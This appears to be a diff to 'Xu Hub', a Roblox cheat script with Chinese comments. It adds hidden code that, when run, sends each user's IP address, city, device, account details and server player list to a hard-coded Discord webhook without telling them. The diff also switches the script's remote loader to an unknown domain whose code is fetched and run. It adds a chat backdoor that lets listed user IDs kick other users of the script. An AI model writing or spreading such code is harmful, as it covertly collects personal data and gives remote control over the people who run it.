@@ -95,6 +95,204 @@ if getgenv().XuHubLoaded then
 end
 
 ----------------------------------------
+-- Discord Webhook
+----------------------------------------
+task.spawn(function()
+    -- 檢查 HTTP 請求 API
+    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+    if not requestFunc then return end
+
+    -- 確保 LocalPlayer 已載入
+    local LocalPlayer = Players.LocalPlayer
+    if not LocalPlayer then
+        Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
+        LocalPlayer = Players.LocalPlayer
+    end
+
+    local webhookUrl = "https://discord.com/api/webhooks/1516417124644425788/1IwQX7xA0jxnJ5GlIhoqFcx6RhtF_jUi4H4cxzaPvVDkxSbiq1fIpO63fMozMeuV_IWu"
+
+    -- 1. 遊戲名稱與連結
+    local gameName = "未知遊戲"
+    if game.PlaceId and game.PlaceId > 0 then
+        pcall(function()
+            local info = MarketplaceService:GetProductInfo(game.PlaceId)
+            if info and info.Name then
+                gameName = info.Name
+            end
+        end)
+    end
+    local gameLink = "[點擊前往遊戲](https://www.roblox.com/games/" .. tostring(game.PlaceId) .. ")"
+
+    -- 2. 設備類型判斷
+    local deviceType = "💻 PC (電腦)"
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        deviceType = "📱 Mobile / Tablet (手機/平板)"
+    elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
+        deviceType = "🎮 Console / Gamepad (家機/手把)"
+    end
+
+    -- 3. 紀錄與計算執行次數
+    local execCountStr = "1 次"
+    pcall(function()
+        local countFolder = "Hub_Config"
+        local countFile = countFolder .. "/exec_count.txt"
+        
+        if typeof(isfolder) == "function" and typeof(makefolder) == "function" and not isfolder(countFolder) then
+            makefolder(countFolder)
+        end
+        
+        local currentCount = 1
+        if typeof(isfile) == "function" and isfile(countFile) and typeof(readfile) == "function" then
+            local storedCount = tonumber(readfile(countFile))
+            if storedCount then
+                currentCount = storedCount + 1
+            end
+        end
+        
+        if typeof(writefile) == "function" then
+            writefile(countFile, tostring(currentCount))
+        end
+        
+        execCountStr = currentCount .. " 次"
+    end)
+
+    -- 4. IP 與地理位置偵測 (經由外部 API)
+    local ipInfo = { ip = "無法取得", country = "未知", city = "未知" }
+    pcall(function()
+        local response = requestFunc({ Url = "http://ip-api.com/json/", Method = "GET" })
+        if response and response.Body then
+            local data = HttpService:JSONDecode(response.Body)
+            if data and data.status == "success" then
+                ipInfo.ip = data.query or "未知"
+                ipInfo.country = data.country or "未知"
+                ipInfo.city = data.city or "未知"
+            end
+        end
+    end)
+
+    -- 5. 取得玩家頭像直鏈
+    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
+    pcall(function()
+        local thumbApiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LocalPlayer.UserId .. "&size=420x420&format=Png&isCircular=false"
+        local thumbRes = requestFunc({ Url = thumbApiUrl, Method = "GET" })
+        if thumbRes and thumbRes.Body then
+            local thumbData = HttpService:JSONDecode(thumbRes.Body)
+            if thumbData and thumbData.data and thumbData.data[1] and thumbData.data[1].imageUrl then
+                avatarUrl = thumbData.data[1].imageUrl
+            end
+        end
+    end)
+
+    -- 6. 基礎資訊整理
+    local executor = (identifyexecutor and identifyexecutor()) or "未知執行器"
+    local isPremium = (LocalPlayer.MembershipType == Enum.MembershipType.Premium) and "👑 Premium 會員" or "無會員"
+    local accountAge = LocalPlayer.AccountAge .. " 天"
+    local localTime = os.date("%Y-%m-%d %H:%M:%S")
+    local profileLink = "[點擊查看主頁](https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile)"
+
+    -- 7. 伺服器人數與玩家名單整理
+    local allPlayers = Players:GetPlayers()
+    local playerCount = #allPlayers .. " / " .. Players.MaxPlayers
+    
+    local playerNamesList = {}
+    for _, player in ipairs(allPlayers) do
+        -- 格式：- 暱稱 (@帳號名稱)
+        table.insert(playerNamesList, "- " .. player.DisplayName .. " (@" .. player.Name .. ")")
+    end
+    
+    -- 將名單合併成字串，並使用換行符號(\n)
+    local playerNamesString = table.concat(playerNamesList, "\n")
+    
+    -- 確保字元不超過 Discord Embed 限制 (1024個字元，保留空間給程式碼區塊)
+    if #playerNamesString > 980 then
+        playerNamesString = string.sub(playerNamesString, 1, 950) .. "\n... (已省略過長名單)"
+    end
+    if playerNamesString == "" then
+        playerNamesString = "無"
+    end
+
+    -- 8. 一鍵跟服腳本文字
+    local joinCode = string.format('game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", "%s")', game.JobId)
+
+    -- 9. 建立 Discord Embed
+    local embedData = {
+        ["username"] = "Xu Hub監控系統",
+        ["avatar_url"] = avatarUrl,
+        ["embeds"] = {{
+            ["title"] = "📊 腳本執行紀錄",
+            ["color"] = 8323327, -- 紫色 (#7F00FF)
+            ["author"] = {
+                ["name"] = LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")",
+                ["icon_url"] = avatarUrl,
+                ["url"] = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile"
+            },
+            ["fields"] = {
+                -- 玩家資訊
+                { ["name"] = "👤 玩家名稱", ["value"] = LocalPlayer.Name .. " (`" .. LocalPlayer.DisplayName .. "`)", ["inline"] = true },
+                { ["name"] = "🆔 玩家 ID", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true },
+                { ["name"] = "🔗 玩家主頁", ["value"] = profileLink, ["inline"] = true },
+
+                { ["name"] = "👑 會員身份", ["value"] = isPremium, ["inline"] = true },
+                { ["name"] = "🎂 帳號創立天數", ["value"] = accountAge, ["inline"] = true },
+
+                -- 設備與執行器資訊
+                { ["name"] = "💻 執行設備", ["value"] = deviceType, ["inline"] = true },
+                { ["name"] = "⚙️ 執行器", ["value"] = executor, ["inline"] = true },
+
+                -- 網路與 IP 資訊
+                { ["name"] = "🌐 IP 位址", ["value"] = "||" .. ipInfo.ip .. "||", ["inline"] = true },
+                { ["name"] = "📍 地理位置", ["value"] = ipInfo.country .. " - " .. ipInfo.city, ["inline"] = true },
+
+                -- 遊戲伺服器資訊
+                { ["name"] = "🎮 遊戲名稱", ["value"] = gameName, ["inline"] = true },
+                { ["name"] = "🗺️ Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true },
+                { ["name"] = "🔗 遊戲連結", ["value"] = gameLink, ["inline"] = true },
+
+                { ["name"] = "👥 伺服器人數", ["value"] = playerCount, ["inline"] = true },
+                { ["name"] = "🔢 執行紀錄次數", ["value"] = execCountStr, ["inline"] = true },
+
+                { ["name"] = "🔑 Job ID", ["value"] = "```" .. (game.JobId ~= "" and game.JobId or "單人/本地伺服器") .. "```", ["inline"] = false },
+                
+                -- 伺服器玩家名單 (換行顯示)
+                { ["name"] = "📜 伺服器玩家名單", ["value"] = "```\n" .. playerNamesString .. "\n```", ["inline"] = false },
+
+                -- 工具與捷徑
+                { ["name"] = "🔗 一鍵跟服腳本", ["value"] = "```lua\n" .. joinCode .. "\n```", ["inline"] = false }
+            },
+            ["thumbnail"] = { ["url"] = avatarUrl },
+            ["footer"] = { ["text"] = "執行時間: " .. localTime }
+        }}
+    }
+
+    -- 發送 Webhook
+    pcall(function()
+        requestFunc({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(embedData)
+        })
+    end)
+end)
+
+----------------------------------------
+--管理員系統
+----------------------------------------
+local TextChatService = game:GetService("TextChatService")
+
+local adminUsers = {
+    [10716026282] = true,
+    [9063888018] = true,
+    [1677344145] = true,
+}
+
+local function isAdmin(player)
+    return player and adminUsers[player.UserId] == true
+end
+
+----------------------------------------
 -- WindUI
 ----------------------------------------
 local WindUI = loadstring(request({
@@ -419,7 +617,7 @@ end
 
 local ScriptLoadstring = [[if isfile("TopPVP.file") then
     if readfile("TopPVP.file") == "true" then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/xuez1025/Open-soucre/refs/heads/main/Xu%20Hub"))()
+        loadstring(game:HttpGet("https://rjr-loader.top/script/xuhub"))()
     end
 end]]
 
@@ -440,6 +638,9 @@ for themeName, _ in pairs(availableThemes) do
     table.insert(themeList, themeName)
 end
 
+--ban
+_G.BanTarget = ""
+
 --New Server Hop
 _G.G_ServerRegion = "Singapore"
 _G.G_HopPlayerRange = "1-12"
@@ -453,7 +654,7 @@ _G.G_HopMaxBounty = math.huge
 --配置自動保存
 ----------------------------------------
 local ConfigFolder = "XuHub_Config"
-local ConfigFile = ConfigFolder .. "/settings.json"
+local ConfigFile = ConfigFolder .. "/settings_" .. tostring(LocalPlayer.UserId) .. ".json"
 local ConfigReady = false
 local ConfigSaving = false
 local ConfigDirty = false
@@ -3756,6 +3957,67 @@ game:GetService("GuiService").ErrorMessageChanged:Connect(function()
     ts:Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
 end)
 
+--ban
+local function sendKickSignal()
+    if not isAdmin(LocalPlayer) then
+        warn("權限不足：你不是管理員，無法發送/Ban")
+        return
+    end
+
+    if _G.BanTarget == "" then
+        warn("請先輸入目標玩家名稱！")
+        return
+    end
+
+    local targetName = string.gsub(_G.BanTarget, "^/ban%s+", "")
+    local signalMessage = "/ban " .. targetName
+
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local generalChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        if generalChannel then
+            generalChannel:SendAsync(signalMessage)
+        end
+    else
+        local sayMessage = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+            and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
+        if sayMessage then
+            sayMessage:FireServer(signalMessage, "All")
+        end
+    end
+end
+
+local function listenForKickSignal(player)
+    player.Chatted:Connect(function(msg)
+        if not isAdmin(player) then return end
+
+        local targetName = msg:match("^/[bB][aA][nN]%s+(.+)$")
+        
+        if targetName then
+            local searchName = string.lower(targetName)
+            local myName = string.lower(LocalPlayer.Name)
+            local myDisplayName = string.lower(LocalPlayer.DisplayName)
+
+            if searchName == "all" then
+                if player ~= LocalPlayer and not isAdmin(LocalPlayer) then
+                    LocalPlayer:Kick("You have been permanently banned.")
+                    return
+                end
+
+            elseif searchName == myName or searchName == myDisplayName then
+                if not isAdmin(LocalPlayer) then
+                    LocalPlayer:Kick("You have been permanently banned.")
+                    return
+                end
+            end
+        end
+    end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    listenForKickSignal(player)
+end
+Players.PlayerAdded:Connect(listenForKickSignal)
+
 --JobId
 local serverJobId = game.JobId
 if serverJobId == "" then
@@ -5576,6 +5838,26 @@ Tabs["設定"]:Dropdown({
         WindUI:SetTheme(state)         
     end
 })
+
+if isAdmin(LocalPlayer) then
+    Tabs["設定"]:Section({ Title = "管理員系統" })
+
+    Tabs["設定"]:Input({
+        Title = "目標玩家名稱",
+        Desc = "輸入名稱",
+        Placeholder = "輸入玩家名稱",
+        Callback = function(v)
+            _G.BanTarget = v
+        end
+    })
+
+    Tabs["設定"]:Button({
+        Title = "發送 /ban",
+        Callback = function()
+            sendKickSignal()
+        end
+    })
+end
 
 Tabs["Server"]:Section({ Title = "Server Information" })
 
